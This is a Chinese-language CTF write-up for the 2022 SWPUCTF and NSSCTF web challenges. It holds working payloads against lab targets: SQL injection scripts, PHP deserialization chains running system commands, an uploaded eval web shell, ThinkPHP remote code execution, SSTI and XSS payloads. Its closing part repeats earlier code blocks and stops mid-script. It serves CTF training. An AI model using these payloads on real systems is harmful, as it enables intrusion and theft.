# 2022 SWPUCTF Web Writeup

> 原文: https://www.ctfiot.com/65440.html
> ID: 65440

Web方向Writeup~

欢迎来到Web安全

F12 -> Source code.

.....
<!-- swpu{da45af69-6aaf-48cb-affc-4f424da5651f} -->
.....

easy_sql

源代码发现需要传递参数为wllm

/?wllm='+order+by+4%23 # Unknown column '4' in 'order clause'

说明只有三列，简单的联合注入

/?wllm='+union+select+1,2,3%23

# 回显
Your Login name:2
Your Password:3

直接用DIOS啦

/?wllm='+union+select+1,2,(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)%23

#回显
......
......
[ test_db ] > test_tb > id|
[ test_db ] > test_tb > fllaag|
[ test_db ] > users > id|
[ test_db ] > users > username|
[ test_db ] > users > password|
[ test_peng ] > test_2tb > number|
[ test_peng ] > test_2tb > ffflllaaaggg|

/?wllm='+union+select+1,2,(select+fllaag+from+test_tb)%23

happy_rce

题目直接给源码

<?php
error_reporting(0);
header("Content-Type:text/html;charset=utf-8");
highlight_file(__FILE__);
if(isset($_POST['url']))
{
    if($_COOKIE['admin']==1)
        include "./next.php";
    else
        echo "怎么吃到只剩一个小饼干？？";
}
else
    echo "怎么POST一个url？？";

?> 怎么POST一个url？？

直接访问next.php,返回jiangnaij.php, 访问jiangnaij.php

<?php
error_reporting(0);
header("Content-Type:text/html;charset=utf-8");
highlight_file(__FILE__);
if (isset($_GET['url'])) {
  $ip=$_GET['url'];
  if(preg_match("/cat|flag| |[0-9]|*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|x09|x26|>|</i", $ip)){
      die('换个方法吧？被过滤啦！');
  }
  eval($ip);
}
?>

发现未过滤$、_、[](), 直接构造HTTP请求

/jiangnaij.php?url=$_GET[Tao]($_GET[c]);&Tao=system&c=cat+/f*

do_not_wakeup

<?php
highlight_file(__FILE__);
class A
{
    private $are_you_a_hacker;

    public function __destruct()
    {
        if ($this->are_you_a_hacker == 'yesyesyes')
        {
            echo getenv('FLAG');
        } else {
            echo 'Night Night, Makka Pakka';
        }
    }

    public function __wakeup()
    {
        $this->are_you_a_hacker = 'nonono';
    }
}

unserialize($_POST['data']);

<?php
class A
{
    private $are_you_a_hacker;

    public function __construct(){
        $this->are_you_a_hacker = 'yesyesyes';
    }
}
$a = str_replace('"A":1:', '"A":2:', serialize(new A()));
echo urlencode($a); // private

注意一下私有变量urlencode一下

post data：

data=O%3A1%3A%22A%22%3A2%3A%7Bs%3A19%3A%22%00A%00are_you_a_hacker%22%3Bs%3A9%3A%22yesyesyes%22%3B%7D

newnew

垃圾回收，原生类的利用

<?php
highlight_file(__FILE__);

class A
{
    public $a;
    public $b;

    public function __destruct()
    {
        echo new $this->a($this->b);
    }
}

$newnew = unserialize($_GET['newnew']);
throw new Exception('can can need new new');

Fatal error: Uncaught Exception: can can need new new in /var/www/html/index.php:16 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 16

使用垃圾回收绕过throw new Exception,具体详情可见：利用PHP垃圾回收机制构造POP链

原生类可参考：CTF 中 PHP原生类的利用

<?php
class A
{
    public $a = 'FilesystemIterator';
    public $b = 'glob:///f*';
}

$o = array(new A, new A);
echo serialize($o);
# a:2:{i:0;O:1:"A":2:{s:1:"a";s:18:"FilesystemIterator";s:1:"b";s:10:"glob:///f*";}i:1;O:1:"A":2:{s:1:"a";s:18:"FilesystemIterator";s:1:"b";s:10:"glob:///f*";}}
# a:2:{i:0;O:1:"A":2:{s:1:"a";s:18:"FilesystemIterator";s:1:"b";s:10:"glob:///f*";}i:0;i:0;}

?newnew=a:2:{i:0;O:1:"A":2:{s:1:"a";s:18:"FilesystemIterator";s:1:"b";s:10:"glob:///f*";}i:0;i:0;}
# fl1aaaaaaa9

读取/fl1aaaaaaa9文件

?newnew=a:2:{i:0;O:1:"A":2:{s:1:"a";s:13:"SplFileObject";s:1:"b";s:12:"/fl1aaaaaaa9";}i:0;i:0;}

baby_pop

<?php
highlight_file(__FILE__);
error_reporting(0);
include "class.php";

if (isset($_GET['source'])) {
    show_source("class.php");
} else {
    unserialize($_GET['pop']);
}

?source

class dstbp
{
    private $cmd;
    private $content;

    public function __construct($cmd, $content)
    {
        $this->cmd = $cmd;
        $this->content = $content;
    }

    public function __invoke()
    {
        ($this->cmd)($this->content);
    }
}

class m1sery
{
    public $ctf;
    public $time = "Two and a half years";

    public function __construct($ctf)
    {
        $this->ctf = $ctf;
    }

    public function __toString()
    {
        return $this->ctf->show();
    }

    public function show(): string
    {
        return $this->ctf . ": Duration of practice: 2.5 years";
    }

}

class s0rry
{
    private $name;
    private $password;
    public $hint = "hint is depend on you";
    public $key;

    public function __construct($name, $password)
    {
        $this->name = $name;
        $this->password = $password;
    }

    public function __destruct()
    {
        echo $this->hint;
    }

}

class jiangnaij
{
    protected $code;

    public function __call($name, $arguments)
    {
        ($this->code)();
    }
}

exp

<?php

class dstbp
{
    private $cmd;
    private $content;

    public function __construct()
    {
        $this->cmd = 'system';
        $this->content = 'cat /flag';
    }
}

class m1sery
{
    public $ctf;
    public $time;
}

class s0rry
{
    private $name;
    private $password;
    public $hint;
    public $key;
}

class jiangnaij
{
    protected $code;
    public function __construct()
    {
        $this->code = new dstbp();
    }
}
$j = new jiangnaij();
$m = new m1sery();
$m->ctf = $j;
$s = new s0rry();
$s->hint = $m;
echo urlencode(serialize($s));

happy_php

<?php
highlight_file(__FILE__);
error_reporting(0);
$a=0.58;
if (!preg_match('/[^0-9]/',$_GET['jiangnaij'])){
    if ((int)(substr(md5($_GET['jiangnaij']),0,6)) === 666666) {
        if (isset($_POST['pysnow']) and isset($_POST['M1sery']))
        {
            if ($_POST['pysnow'] != $_POST['M1sery'])
            {
                if (md5($_POST['pysnow']) == md5($_POST['M1sery'])){
                    if (isset($_POST['s0rry']) and isset($_POST['DSTBP']))
                    {
                        if ((string)$_POST['s0rry'] != (string)$_POST['DSTBP'])
                        {
                            if (md5($_POST['s0rry']) === md5($_POST['DSTBP'])) 
                            {
                                if ($_GET['csc8'] == intval($a * 100)){
                                    include '/flag.php';
                                    echo $flag;
                                }
                                else echo "csc8说你错了";
                            }
                            else echo 's0rry和DSTBP说你错了';
                        }
                        else echo "请输入不同的s0rry，DSTBP";
                    }
                    else echo "s0rry和DSTBP说快来玩";
                }
                else echo 'pysnow和M1sery说你错了';
            }
            else echo "请输入不同的pysnow，M1sery";
        }
        else echo "pysnow和M1sery说快来玩";
    }
    else echo "相等吗？？？";
}
else echo "输入一个数，这个数md5加密后前六位全是6！";

import multiprocessing
import hashlib
import random
import string
import sys

#CHARS = string.letters + string.digits
CHARS = '0123456789'

def cmp_md5(substr, stop_event, str_len, start=0, size=20):
    global CHARS

    while not stop_event.is_set():
        rnds = ''.join(random.choice(CHARS) for _ in range(size))
        md5 = hashlib.md5(rnds)

        if md5.hexdigest()[start: start+str_len] == substr:
            print rnds
            stop_event.set()

if __name__ == '__main__':
    substr = sys.argv[1].strip()

    start_pos = int(sys.argv[2]) if len(sys.argv) > 1 else 0

    str_len = len(substr)
    cpus = multiprocessing.cpu_count()
    stop_event = multiprocessing.Event()
    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,
                                         stop_event, str_len, start_pos))
                 for i in range(cpus)]

    for p in processes:
        p.start()

    for p in processes:
        p.join()

python2 exp.py "666666" 0得到数字36805032837458517684

php -r 'var_dump(intval(0.58 * 100));'
int(57)

POST /?jiangnaij=36805032837458517684&csc8=57 HTTP/1.1
Host: 175.24.172.136:30007
Content-Length: 422
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://175.24.172.136:30007/?jiangnaij=36805032837458517684&csc8=57
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

pysnow[]=Tao&M1sery[]=oo&s0rry=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&DSTBP=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2

easy_xss

F12 Source 访问xssssssssssssssssssssssssss.php

插入xss代码，题目提示返回没弹窗怎么获取flag啊

"><svg/onload=alert("flag")>

拿到flag

baby_ssrf

题目提示源码泄露，扫描发现.git,www.zip,wwwroot.zip

www.zip ，提示flag就在flag.php中

/.git:

flag2:
17fa-4aec-

wwwroot.zip

flag3: iwukagerfbh-qwde}

<?php
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
    $host=$x['host'];
    if((substr($host)<=7)){
        $swpu=curl_init($url);
        curl_setopt($swpu, CURLOPT_HEADER, 0);
        curl_setopt($swpu, CURLOPT_RETURNTRANSFER, 1);
        $result=curl_exec($swpu);
        curl_close($swpu);
        echo ($result);
    }
    else{
        die('hacker！');
    }
}
else{
    die('怎么做？');
}
?>

结合给的源代码，发现本地访问至flag.php即可获得flag

url=http://sudo.cc/flag.php 使用sudo.cc绕过<=位限制

sql2

fuzz发现，可利用extractvalue进行报错注入，大小写绕过关键词过滤

?wllm='/**/And/**/extractvalue(rand(),Concat(CHAR(126),user(),CHAR(126)))%23

/?wllm='/**/And/**/extractvalue(rand(),Concat(CHAR(126),(Select/**/Group_Concat(database_name)/**/From/**/mysql.innodb_table_stats),CHAR(126)))%23
# XPATH syntax error: '~mysql,test_db,test_db~'

/?wllm='/**/And/**/extractvalue(rand(),Concat(CHAR(126),(Select/**/Group_Concat(database_name)/**/From/**/mysql.innodb_table_stats),CHAR(126)))%23
# '~gtid_slave_pos,test_tb,users~'

无列名注入

/?wllm='/**/And/**/extractvalue(rand(),Concat(CHAR(126),(Select/**/`2`/**/From(Select/**/1,2/**/Union/**/Select/**/*/**/From/**/test_tb)a/**/Limit/**/1,1),CHAR(126)))%23  
# XPATH syntax error: '~swpu{aba16000-448a-4bfb-874f-7d'

/?wllm='/**/And/**/extractvalue(rand(),Concat(CHAR(126),(Select/**/Reverse(`2`)/**/From(Select/**/1,2/**/Union/**/Select/**/*/**/From/**/test_tb)a/**/Limit/**/1,1),CHAR(126)))%23

XPATH syntax error: '~}69e2a4f858d7-f478-bfb4-a844-00'

其实盲注也是可以的，见sql3

php_upload

文件上传后，直接包含！

$wllm = waf($_GET["wllm"]);
include("$wllm");

先传图片木马，之后包含?wllm=upload/546abe96bee75c6fda395809c08708d1/m.gif,既可getshell.

can_you_faster

计算器脚本题

import requests
import time
from bs4 import BeautifulSoup

url = 'http://175.24.172.136:30041/'
s = requests.session()
for i in range(200):
 print(i)
 res = s.get(url)
 soup = BeautifulSoup(res.text,'html.parser')
 get_express = soup.find_all('a')[2].text
 get_express = get_express.replace('=','')
 exres = eval(get_express)
 time.sleep(1)
 data = {
  'result':exres,
  'submit': '提交'}
 r = s.post(url,data=data)
 print(r.text)
 if 'swpu{' in r.text:
  print(r.text)
  break

easy_flask

一个简单的SSTI

/hello/%7B%7Bconfig%7D%7D

/hello/{{lipsum.__globals__['os'].popen('ls').read()}}

/hello/{{lipsum.__globals__['os'].popen('cat%20flag').read()}}

SSTI进阶

easy_include

<?php
include_once "flag.php";
error_reporting(0);
function waf($file): bool
{
    if (preg_match('/http|info|https|utf|zlib|data|rot13|input|base64|log|sess/s', $file)) {
        return false;
    } else return true;
}

if (isset($_GET['key']) && waf(strtolower($_GET['key']))) {
    $key = call_user_func($_GET['key']);
    if ($key == "swpu") {
        $file = $_POST['file'];
        if (waf($file)) {
            include_once $file;
        } else {
            echo "Get Out Hacker!";
        }
    } else {
        echo "Wrong key!";
    }
} else {
    highlight_file(__FILE__);
}

/?key=json_last_error 返回0 弱类型比较

file=php://filter/convert.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php

require_once包含的软链接层数较多时once的hash匹配会直接失效造成重复包含

base64编码两次是因为，浏览器解码一次，include的时候，会解码一次（从而绕过正则匹配）

原理参考：https://www.anquanke.com/post/id/213235

ez_upload

.htaccess利用，base64编码绕过<检测。修改MIME为jpg类型

php_value auto_append_file "php://filter/convert.base64-decode/resource=Tao.php"

# Tao.php 内容如下：
PD9waHAgZWNobyAiVGFvIjtldmFsKCRfUkVRVUVTVFswXSk7Pz4=
# 解码为：
# <?php echo "Tao";eval($_REQUEST[0]);?>

之后anstword  bypass disable_functions

或者

?0=var_dump(new DirectoryIterator("glob:///f*"));
# /fllllllllllll4g
?0=mkdir('Tao');chdir('Tao');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo (file_get_contents('fllllllllllll4g'));

sql3

import requests
import time
# swpu_wllm_boolsql
# gtid_slave_pos,flag,username
#id,username,password,id,flag

def inject(url):
 name = ''

 for i in range(1,100000):
  low = 32
  high = 128
  mid = (low + high) // 2
  while low < high:
   #payload = '0"/**/or/**/iF(Ascii(Substr((Select/**/Group_concat(table_name)/**/From/**/mysql.innodb_table_stats),%d,1))>%d,Sleep(1),0)#' % (i,mid)
   #print(payload)
   #payload = '0"/**/or/**/If(Ascii(Substr((Select/**/Group_concat(column_name)/**/From/**/information_schema.columns/**/Where/**/table_schema=0x737770755F776C6C6D5F626F6F6C73716C),%d,1))>%d,Sleep(1),0)#'  % (i,mid)
   payload = '0"/**/or/**/If(Ascii(Substr((Select/**/Group_concat(flag)/**/From/**/username),%d,1))>%d,Sleep(1),0)#'  % (i,mid)
   print(payload)
   params = {'username':payload}
   start_time = time.time() # 注入前的系统时间
   r = requests.post(url,data = params)
   end_time = time.time()  #  注入后的时间
   if end_time - start_time > 1:
    low = mid + 1
   else:
    high = mid
   mid = (low + high) // 2

  if mid == 32:
   break
  name = name + chr(mid) 
  print(name)

inject("http://175.24.172.136:30063/")

NSS Web

1. funny_web

爆破某人QQ?

<?php
error_reporting(0);
header("Content-Type: text/html;charset=utf-8");
highlight_file(__FILE__);
include('flag.php');
if (isset($_GET['num'])) {
    $num = $_GET['num'];
    if ($num != '12345') {
        if (intval($num) == '12345') {
            echo $FLAG;
        }
    } else {
        echo "这为何相等又不相等";
    }
}

?num=12345e

2. 奇妙的MD5

ffifdyop ->  md5: 276f722736c95d99e921722cf9ed621c -> to string: 'or'6<trash>

<!--
$x= $GET['x'];
$y = $_GET['y'];
if($x != $y && md5($x) == md5($y)){
    ;
-->

?x[]=ACT&y[]=Tao

<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['wqh']!==$_POST['dsy']&&md5($_POST['wqh'])===md5($_POST['dsy'])){
    echo $FLAG;
}

POST /f1na11y.php HTTP/1.1
Host: 1.14.71.254:28607
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://1.14.71.254:28607/f1na11y.php
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: td_cookie=955577959
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 393

wqh=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&dsy=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2

https://blog.csdn.net/m0_52923241/article/details/119669647

3. where_am_i

02886112888

4. ez_ez_php

?file=php://filter/read=convert-base64.encode/resource=flag

5. webdog1__start

<?php
error_reporting(0);

highlight_file(__FILE__);

if (isset($_GET['get'])){
    $get=$_GET['get'];
    if(!strstr($get," ")){
        $get = str_ireplace("flag", " ", $get);
        
        if (strlen($get)>18){
            die("This is too long.");
            }
            
            else{
                eval($get);
          } 
    }else {
        die("nonono"); 
    }

}

/F1l1l1l1l1lag.php?get=system("cat%09/f*");

6. Ez_upload

“.htaccess`, MIME

AddType application/x-httpd-php .jpg

POST / HTTP/1.1
Host: 1.14.71.254:28890
Content-Length: 322
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Origin: http://1.14.71.254:28890
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoeioPhnZHf89aU1I
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://1.14.71.254:28890/
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Connection: close

------WebKitFormBoundaryoeioPhnZHf89aU1I
Content-Disposition: form-data; name="uploaded"; filename=".htaccess"
Content-Type: image/jpeg

AddType application/x-httpd-php .jpg
------WebKitFormBoundaryoeioPhnZHf89aU1I
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryoeioPhnZHf89aU1I--

<?检测

POST / HTTP/1.1
Host: 1.14.71.254:28890
Content-Length: 335
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://1.14.71.254:28890
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqQFrjPfCB9vBZcue
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://1.14.71.254:28890/
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: td_cookie=957449640; PHPSESSID=7ad99d11abbb350e60d1e78984493ab0
Connection: close

------WebKitFormBoundaryqQFrjPfCB9vBZcue
Content-Disposition: form-data; name="uploaded"; filename="Tao.jpg"
Content-Type: image/jpeg

<script language="php">eval($_REQUEST[0]);</script>
------WebKitFormBoundaryqQFrjPfCB9vBZcue
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryqQFrjPfCB9vBZcue--

7. numgame

js/1.js

NSSCTF{TnNTY1RmLnBocA==} -> NsScTf.php

<?php
error_reporting(0);
//hint: 与get相似的另一种请求协议是什么呢
include("flag.php");
class nss{
    static function ctf(){
        include("./hint2.php");
    }
}
if(isset($_GET['p'])){
    if (preg_match("/n|c/m",$_GET['p'], $matches))
        die("no");
    call_user_func($_GET['p']);
}else{
    highlight_file(__FILE__);
}

/NsScTf.php?p=Nss2::Ctf

8. ez_ez_php(revenge)

php://filter/read=convert-base64.encode/resource=/flag

9. ez_rce

/robots.txt

/NSS/index.php/

/NSS/index.php/?s=index/thinkapp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find+/+-type+f+-name+'flag'+2>/dev/null

/NSS/index.php/?s=index/thinkapp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat+/nss/ctf/flag/flag

10. ez_sql

nss=-41'/**/Ununionion/**/SelEct/**/1,2,group_concat(id,Secr3t,flll444g)/**/from/**/NSS_tb%23

11. ez_1zpop

<?php
error_reporting(0);
class dxg
{
   function fmm()
   {
      return "nonono";
   }
}

class lt
{
   public $impo='hi';
   public $md51='weclome';
   public $md52='to NSS';
   function __construct()
   {
      $this->impo = new dxg;
   }
   function __wakeup()
   {
      $this->impo = new dxg;
      return $this->impo->fmm();
   }

   function __toString()
   {
      if (isset($this->impo) && md5($this->md51) == md5($this->md52) && $this->md51 != $this->md52)
         return $this->impo->fmm();
   }
   function __destruct()
   {
      echo $this;
   }
}

class fin
{
   public $a;
   public $url = 'https://www.ctfer.vip';
   public $title;
   function fmm()
   {
      $b = $this->a;
      $b($this->title);
   }
}

if (isset($_GET['NSS'])) {
   $Data = unserialize($_GET['NSS']);
} else {
   highlight_file(__file__);
}

<?php
error_reporting(0);
class dxg
{
   function fmm()
   {
      return "nonono";
   }
}

class fin
{
   public $a = 'system';
   public $url = 'Tao';
   public $title = 'cat /*';
//    function fmm()
//    {
//       $b = $this->a;
//       $b($this->title);
//    }
}

class lt
{
   public $impo='hi';
   public $md51='aabg7XSs';
   public $md52='s878926199a';
   function __construct()
   {
      $this->impo = new fin();
   }
}

$a = serialize(new lt());
$a = str_replace('"lt":3:','"lt":4:',$a);
echo urlencode($a);

12. 1z_unserialize

<?php
 
class lyh{
    public $url = 'NSSCTF.com';
    public $lt;
    public $lly;
     
     function  __destruct()
     {
        $a = $this->lt;

        $a($this->lly);
     }
    
    
}
unserialize($_POST['nss']);
highlight_file(__FILE__);
 
 
?> 

#exp
<?php
 
class lyh{
    public $url = 'Tao';
    public $lt = 'system';
    public $lly = 'cat /f*';
     
     function  __destruct()
     {
        $a = $this->lt;

        #$a($this->lly);
     }
    
    
}
echo urlencode(serialize(new lyh()));
 
?> 

13.xff

GET / HTTP/1.1
Host: 1.14.71.254:28860
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Referer: http://1.14.71.254:28860/home
X-FORWARDED-FOR:127.0.0.1
Connection: close

14. js_sign

document.getElementsByTagName("button")[0].addEventListener("click", ()=>{
    flag="33 43 43 13 44 21 54 34 45 21 24 33 14 21 31 11 22 12 54 44 11 35 13 34 14 15"
    if (btoa(flag.value) == 'dGFwY29kZQ==') {
        alert("you got hint!!!");
    } else {
        alert("fuck off !!");
    }    
})

tapcode

https://www.boxentriq.com/code-breaking/tap-code


```
.....
<!-- swpu{da45af69-6aaf-48cb-affc-4f424da5651f} -->
.....
```



```
/?wllm='+order+by+4%23 # Unknown column '4' in 'order clause'
```



```
/?wllm='+union+select+1,2,3%23

# 回显
Your Login name:2
Your Password:3
```



```
/?wllm='+union+select+1,2,(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)%23
```



```
#回显
......
......
[ test_db ] > test_tb > id|
[ test_db ] > test_tb > fllaag|
[ test_db ] > users > id|
[ test_db ] > users > username|
[ test_db ] > users > password|
[ test_peng ] > test_2tb > number|
[ test_peng ] > test_2tb > ffflllaaaggg|
```



```
/?wllm='+union+select+1,2,(select+fllaag+from+test_tb)%23
```



```
<?php
error_reporting(0);
header("Content-Type:text/html;charset=utf-8");
highlight_file(__FILE__);
if(isset($_POST['url']))
{
    if($_COOKIE['admin']==1)
        include "./next.php";
    else
        echo "怎么吃到只剩一个小饼干？？";
}
else
    echo "怎么POST一个url？？";

?> 怎么POST一个url？？
```



```
<?php
error_reporting(0);
header("Content-Type:text/html;charset=utf-8");
highlight_file(__FILE__);
if (isset($_GET['url'])) {
  $ip=$_GET['url'];
  if(preg_match("/cat|flag| |[0-9]|*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|x09|x26|>|</i", $ip)){
      die('换个方法吧？被过滤啦！');
  }
  eval($ip);
}
?>
```



```
<?php
highlight_file(__FILE__);
class A
{
    private $are_you_a_hacker;

    public function __destruct()
    {
        if ($this->are_you_a_hacker == 'yesyesyes')
        {
            echo getenv('FLAG');
        } else {
            echo 'Night Night, Makka Pakka';
        }
    }

    public function __wakeup()
    {
        $this->are_you_a_hacker = 'nonono';
    }
}

unserialize($_POST['data']);
```



```
<?php
class A
{
    private $are_you_a_hacker;

    public function __construct(){
        $this->are_you_a_hacker = 'yesyesyes';
    }
}
$a = str_replace('"A":1:', '"A":2:', serialize(new A()));
echo urlencode($a); // private
```



```
<?php
highlight_file(__FILE__);

class A
{
    public $a;
    public $b;

    public function __destruct()
    {
        echo new $this->a($this->b);
    }
}

$newnew = unserialize($_GET['newnew']);
throw new Exception('can can need new new');

Fatal error: Uncaught Exception: can can need new new in /var/www/html/index.php:16 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 16
```



```
<?php
class A
{
    public $a = 'FilesystemIterator';
    public $b = 'glob:///f*';
}

$o = array(new A, new A);
echo serialize($o);
# a:2:{i:0;O:1:"A":2:{s:1:"a";s:18:"FilesystemIterator";s:1:"b";s:10:"glob:///f*";}i:1;O:1:"A":2:{s:1:"a";s:18:"FilesystemIterator";s:1:"b";s:10:"glob:///f*";}}
# a:2:{i:0;O:1:"A":2:{s:1:"a";s:18:"FilesystemIterator";s:1:"b";s:10:"glob:///f*";}i:0;i:0;}
```



```
?newnew=a:2:{i:0;O:1:"A":2:{s:1:"a";s:18:"FilesystemIterator";s:1:"b";s:10:"glob:///f*";}i:0;i:0;}
# fl1aaaaaaa9
```



```
?newnew=a:2:{i:0;O:1:"A":2:{s:1:"a";s:13:"SplFileObject";s:1:"b";s:12:"/fl1aaaaaaa9";}i:0;i:0;}
```



```
<?php
highlight_file(__FILE__);
error_reporting(0);
include "class.php";

if (isset($_GET['source'])) {
    show_source("class.php");
} else {
    unserialize($_GET['pop']);
}
```



```
class dstbp
{
    private $cmd;
    private $content;

    public function __construct($cmd, $content)
    {
        $this->cmd = $cmd;
        $this->content = $content;
    }

    public function __invoke()
    {
        ($this->cmd)($this->content);
    }
}

class m1sery
{
    public $ctf;
    public $time = "Two and a half years";

    public function __construct($ctf)
    {
        $this->ctf = $ctf;
    }

    public function __toString()
    {
        return $this->ctf->show();
    }

    public function show(): string
    {
        return $this->ctf . ": Duration of practice: 2.5 years";
    }

}

class s0rry
{
    private $name;
    private $password;
    public $hint = "hint is depend on you";
    public $key;

    public function __construct($name, $password)
    {
        $this->name = $name;
        $this->password = $password;
    }

    public function __destruct()
    {
        echo $this->hint;
    }

}

class jiangnaij
{
    protected $code;

    public function __call($name, $arguments)
    {
        ($this->code)();
    }
}
```



```
<?php

class dstbp
{
    private $cmd;
    private $content;

    public function __construct()
    {
        $this->cmd = 'system';
        $this->content = 'cat /flag';
    }
}

class m1sery
{
    public $ctf;
    public $time;
}

class s0rry
{
    private $name;
    private $password;
    public $hint;
    public $key;
}

class jiangnaij
{
    protected $code;
    public function __construct()
    {
        $this->code = new dstbp();
    }
}
$j = new jiangnaij();
$m = new m1sery();
$m->ctf = $j;
$s = new s0rry();
$s->hint = $m;
echo urlencode(serialize($s));
```



```
<?php
highlight_file(__FILE__);
error_reporting(0);
$a=0.58;
if (!preg_match('/[^0-9]/',$_GET['jiangnaij'])){
    if ((int)(substr(md5($_GET['jiangnaij']),0,6)) === 666666) {
        if (isset($_POST['pysnow']) and isset($_POST['M1sery']))
        {
            if ($_POST['pysnow'] != $_POST['M1sery'])
            {
                if (md5($_POST['pysnow']) == md5($_POST['M1sery'])){
                    if (isset($_POST['s0rry']) and isset($_POST['DSTBP']))
                    {
                        if ((string)$_POST['s0rry'] != (string)$_POST['DSTBP'])
                        {
                            if (md5($_POST['s0rry']) === md5($_POST['DSTBP'])) 
                            {
                                if ($_GET['csc8'] == intval($a * 100)){
                                    include '/flag.php';
                                    echo $flag;
                                }
                                else echo "csc8说你错了";
                            }
                            else echo 's0rry和DSTBP说你错了';
                        }
                        else echo "请输入不同的s0rry，DSTBP";
                    }
                    else echo "s0rry和DSTBP说快来玩";
                }
                else echo 'pysnow和M1sery说你错了';
            }
            else echo "请输入不同的pysnow，M1sery";
        }
        else echo "pysnow和M1sery说快来玩";
    }
    else echo "相等吗？？？";
}
else echo "输入一个数，这个数md5加密后前六位全是6！";
```



```
import multiprocessing
import hashlib
import random
import string
import sys

#CHARS = string.letters + string.digits
CHARS = '0123456789'

def cmp_md5(substr, stop_event, str_len, start=0, size=20):
    global CHARS

    while not stop_event.is_set():
